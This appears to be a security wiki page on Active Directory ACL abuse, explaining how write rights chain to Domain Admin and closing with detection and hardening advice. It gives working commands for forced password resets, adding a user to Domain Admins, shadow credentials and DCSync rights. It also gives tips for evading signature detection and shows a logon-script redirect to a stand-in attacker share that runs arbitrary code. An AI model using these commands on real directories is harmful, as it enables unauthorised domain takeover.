---
title: ACL abuse
slug: acl-abuse
---

> **TL;DR:** GenericAll, WriteDACL, WriteOwner, ForceChangePassword, GenericWrite, AddMembers, AllExtendedRights — write rights on AD objects chain into authentication or membership and from there to Domain Admin.

## What it is
AD objects (users, groups, computers, OUs, GPO links, the domain head) carry a discretionary ACL of access-control entries. When a low-privilege principal has been granted (or inherits) a "write" right on a sensitive object, that right can usually be chained into authentication material or group membership. ACL abuse is the practice of walking those rights from a foothold to Domain Admin or to a specific tier-0 target.

## Preconditions / where it applies
- A foothold principal (user, computer, gMSA) that holds — directly or transitively via group membership — a useful right on a privileged object.
- An LDAP-reachable DC and ability to authenticate (any valid creds).
- For some primitives, SMB/RPC to the target host as well (e.g. RBCD requires writing to a computer object then S4U2Proxy against it).

## Technique
Map rights first, then pick a primitive. [[bloodhound|BloodHound]]'s shortest-path queries solve the routing problem.

Common edges and their canonical exploitation:

- **GenericAll / WriteDACL / WriteOwner** on a user: reset password, set SPN and kerberoast, or write `msDS-KeyCredentialLink` ([[shadow-credentials]]).
- **ForceChangePassword** on a user: `net rpc password TARGET 'P@ss!' -U DOM/me%pw -S dc`.
- **GenericWrite** on a user: set SPN for [[kerberoasting]], or set `msDS-AllowedToActOnBehalfOfOtherIdentity` for [[resource-based-constrained-delegation]].
- **AddMembers** on a group: add yourself, re-auth to refresh the PAC.
- **WriteDACL on the domain head or AdminSDHolder**: grant yourself `DS-Replication-Get-Changes-All` and run [[dcsync]].
- **AllExtendedRights** on a user with confidential attributes: read LAPS password, manage Certificate Mapping.
- **WriteProperty on `member`** of Protected Users / Domain Admins: drop yourself in.
- **GenericAll on a computer**: shadow-credentials or RBCD → SYSTEM on the host.

Impacket / pywerview / bloodyAD / Certipy / PowerView expose primitives. Examples:

```bash
# AddMember
bloodyAD --host dc -d corp -u me -p 'pw' add groupMember 'Domain Admins' me
# Shadow Credentials
certipy shadow auto -username me@corp -p 'pw' -account victim
# DCSync rights via WriteDACL on domain head
dacledit.py -action write -rights DCSync -principal me corp/me:'pw'@dc
```

Don't forget inherited ACEs from OUs and the implicit owner-write rule: an object's owner can always rewrite its DACL — useful when WriteOwner is the only edge.

ADSI bypass: when `Set-Acl` or the AD PowerShell module refuses (signature checks, missing module, or a constrained-language host), fall back to raw `[ADSI]` + `ActiveDirectoryAccessRule` to commit the ACE — this also tends to be quieter than dropping `Add-DomainObjectAcl` from PowerView, which is heavily signatured. A often-missed edge is `WriteProperty` on `scriptPath` alone: it doesn't grant password reset or SPN write, but pointing the victim's logon script at `\\attacker\evil.ps1` fires arbitrary code at their next interactive logon — handy when the only foothold ACE is that single property write.

## Detection and defence
- Tier the directory: keep tier-0 (DCs, AdminSDHolder, cert templates, GPOs linked to DC OU) clean of low-tier write rights.
- Audit DS-object-access (4662) for writes to `nTSecurityDescriptor`, `msDS-KeyCredentialLink`, `servicePrincipalName`, `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- Run BloodHound from the defender side; hunt for any non-tier-0 principal with paths to tier-0.
- Strip "Authenticated Users" / "Everyone" from sensitive ACLs and watch for SDProp reverting your fixes (60-min cycle).
- Enable [[adcs-attacks|AD CS]] strong mapping (KB5014754) so cert-based ACL abuse is harder.

## References
- [SpecterOps — An ACE Up The Sleeve](https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-925f86a1d3f8) — DACL backdoor mechanics
- [HackTricks — ACL persistence and abuse](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html) — primitive catalogue
- [the.hacker.recipes — DACL](https://www.thehacker.recipes/ad/movement/dacl) — per-edge walkthrough
- [BloodHound community docs](https://bloodhound.specterops.io/) — edge-by-edge abuse info
- [ired.team — abusing AD ACLs/ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) — PowerView and raw ADSI primitives
